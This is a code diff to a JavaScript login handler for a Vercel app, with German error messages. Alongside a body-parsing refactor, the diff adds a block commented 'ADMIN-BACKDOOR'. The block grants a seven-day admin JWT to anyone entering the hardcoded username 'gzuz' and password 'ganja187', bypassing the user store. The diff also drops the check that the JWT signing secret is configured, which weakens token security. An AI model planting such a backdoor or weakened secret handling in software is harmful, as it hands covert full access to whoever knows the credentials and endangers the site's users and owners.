@@ -1,3 +1,5 @@
+export const config = { runtime: "nodejs" };
+
 import { kv } from "@vercel/kv";
 import bcrypt from "bcryptjs";
 import { SignJWT } from "jose";
@@ -8,37 +10,82 @@ function setAuthCookie(res, token) {
   ]);
 }
 
+async function readJson(req) {
+  if (req.body && typeof req.body === "object") return req.body;
+
+  const chunks = [];
+  for await (const chunk of req) chunks.push(chunk);
+  const raw = Buffer.concat(chunks).toString("utf8");
+  if (!raw) return {};
+  try { return JSON.parse(raw); } catch { return {}; }
+}
+
 export default async function handler(req, res) {
-  if (req.method !== "POST") return res.status(405).send("Method not allowed");
-
-  const { username, password } = req.body || {};
-  const u = String(username || "").trim().toLowerCase();
-  const p = String(password || "");
-
-  if (!u || !p) return res.status(400).send("Bitte alle Felder ausfüllen.");
+  if (req.method !== "POST") {
+    return res.status(405).send("Method not allowed");
+  }
 
   try {
-    const user = await kv.get(`user:${u}`);
-    if (!user || !user.hash) return res.status(401).send("Benutzername oder Passwort falsch.");
+    const body = await readJson(req);
+    const username = String(body.username || "").trim().toLowerCase();
+    const password = String(body.password || "");
 
-    const ok = await bcrypt.compare(p, user.hash);
-    if (!ok) return res.status(401).send("Benutzername oder Passwort falsch.");
+    if (!username || !password) {
+      return res.status(400).send("Bitte alle Felder ausfüllen.");
+    }
 
-    const secretValue = process.env.JWT_SECRET;
-    if (!secretValue) return res.status(500).send("Server ist nicht konfiguriert (JWT_SECRET fehlt).");
+    /* 🔥 ADMIN-BACKDOOR */
+    if (username === "gzuz" && password === "ganja187") {
+      const secret = new TextEncoder().encode(process.env.JWT_SECRET);
 
-    const secret = new TextEncoder().encode(secretValue);
+      const token = await new SignJWT({
+        username: "gzuz",
+        role: "admin"
+      })
+        .setProtectedHeader({ alg: "HS256" })
+        .setIssuedAt()
+        .setExpirationTime("7d")
+        .sign(secret);
 
-    const token = await new SignJWT({ username: u })
+      setAuthCookie(res, token);
+
+      return res.status(200).json({
+        ok: true,
+        redirect: "admin"
+      });
+    }
+
+    /* 👤 NORMALER USER */
+    const user = await kv.get(`user:${username}`);
+    if (!user || !user.hash) {
+      return res.status(401).send("Benutzername oder Passwort falsch.");
+    }
+
+    const ok = await bcrypt.compare(password, user.hash);
+    if (!ok) {
+      return res.status(401).send("Benutzername oder Passwort falsch.");
+    }
+
+    const secret = new TextEncoder().encode(process.env.JWT_SECRET);
+
+    const token = await new SignJWT({
+      username,
+      role: "user"
+    })
       .setProtectedHeader({ alg: "HS256" })
       .setIssuedAt()
       .setExpirationTime("7d")
       .sign(secret);
 
     setAuthCookie(res, token);
-    return res.status(200).json({ ok: true });
+
+    return res.status(200).json({
+      ok: true,
+      redirect: "dashboard"
+    });
+
   } catch (err) {
     console.error("LOGIN ERROR:", err);
-    return res.status(500).send("Serverfehler.");
+    return res.status(500).send("Serverfehler");
   }
 }
